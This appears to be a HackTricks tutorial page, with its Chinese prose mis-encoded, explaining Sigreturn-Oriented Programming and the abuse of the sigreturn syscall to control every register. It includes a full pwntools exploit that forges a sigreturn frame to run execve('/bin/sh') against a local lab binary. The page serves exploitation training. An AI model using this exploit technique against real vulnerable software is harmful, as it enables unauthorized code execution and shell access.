# SROP - Sigreturn-Oriented Programming

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

**`Sigreturn`** æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ **syscall**ï¼Œä¸»è¦ç”¨äºåœ¨ä¿¡å·å¤„ç†ç¨‹åºå®Œæˆæ‰§è¡Œåè¿›è¡Œæ¸…ç†ã€‚ä¿¡å·æ˜¯æ“ä½œç³»ç»Ÿå‘é€ç»™ç¨‹åºçš„ä¸­æ–­ï¼Œé€šå¸¸ç”¨äºæŒ‡ç¤ºå‘ç”Ÿäº†ä¸€äº›å¼‚å¸¸æƒ…å†µã€‚å½“ç¨‹åºæ¥æ”¶åˆ°ä¿¡å·æ—¶ï¼Œå®ƒä¼šæš‚æ—¶æš‚åœå½“å‰å·¥ä½œï¼Œä»¥é€šè¿‡ **signal handler** å¤„ç†ä¿¡å·ï¼Œsignal handler æ˜¯ä¸€ä¸ªä¸“é—¨å¤„ç†ä¿¡å·çš„å‡½æ•°ã€‚

åœ¨ä¿¡å·å¤„ç†ç¨‹åºå®Œæˆåï¼Œç¨‹åºéœ€è¦ **æ¢å¤å…¶å…ˆå‰çš„çŠ¶æ€**ï¼Œå°±åƒä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿä¸€æ ·ã€‚è¿™å°±æ˜¯ **`sigreturn`** å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚å®ƒå¸®åŠ©ç¨‹åº **ä»ä¿¡å·å¤„ç†ç¨‹åºè¿”å›**ï¼Œå¹¶é€šè¿‡æ¸…ç†ä¿¡å·å¤„ç†ç¨‹åºä½¿ç”¨çš„æ ˆå¸§ï¼ˆå­˜å‚¨å‡½æ•°è°ƒç”¨å’Œå±€éƒ¨å˜é‡çš„å†…å­˜åŒºåŸŸï¼‰æ¥æ¢å¤ç¨‹åºçš„çŠ¶æ€ã€‚

æœ‰è¶£çš„æ˜¯ **`sigreturn`** æ˜¯å¦‚ä½•æ¢å¤ç¨‹åºçŠ¶æ€çš„ï¼šå®ƒé€šè¿‡å°† **æ‰€æœ‰ CPU çš„å¯„å­˜å™¨å€¼å­˜å‚¨åœ¨æ ˆä¸Š** æ¥å®ç°ã€‚å½“ä¿¡å·ä¸å†è¢«é˜»å¡æ—¶ï¼Œ**`sigreturn` ä»æ ˆä¸­å¼¹å‡ºè¿™äº›å€¼**ï¼Œæœ‰æ•ˆåœ°å°† CPU çš„å¯„å­˜å™¨é‡ç½®ä¸ºå¤„ç†ä¿¡å·ä¹‹å‰çš„çŠ¶æ€ã€‚è¿™åŒ…æ‹¬æŒ‡å‘å½“å‰æ ˆé¡¶çš„æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆRSPï¼‰ã€‚

{% hint style="danger" %}
ä» ROP é“¾ä¸­è°ƒç”¨ syscall **`sigreturn`** å¹¶ **æ·»åŠ æˆ‘ä»¬å¸Œæœ›åŠ è½½åˆ°æ ˆä¸­çš„å¯„å­˜å™¨å€¼**ï¼Œå¯ä»¥ **æ§åˆ¶** æ‰€æœ‰å¯„å­˜å™¨å€¼ï¼Œå› æ­¤ **è°ƒç”¨** ä¾‹å¦‚ syscall `execve` å’Œ `/bin/sh`ã€‚
{% endhint %}

æ³¨æ„è¿™å°†æ˜¯ä¸€ç§ **Ret2syscall** ç±»å‹ï¼Œä½¿å¾—æ§åˆ¶å‚æ•°ä»¥è°ƒç”¨å…¶ä»– Ret2syscalls å˜å¾—æ›´åŠ å®¹æ˜“ï¼š

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

è¦æ›´å¥½åœ°ç†è§£ï¼Œè¯·æŸ¥çœ‹ï¼š

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Example

æ‚¨å¯ä»¥ [**åœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªç¤ºä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop)ï¼Œå°½ç®¡è¿™æ˜¯æ¥è‡ªé‚£é‡Œçš„æœ€ç»ˆåˆ©ç”¨ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
## å‚è€ƒæ–‡çŒ®

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
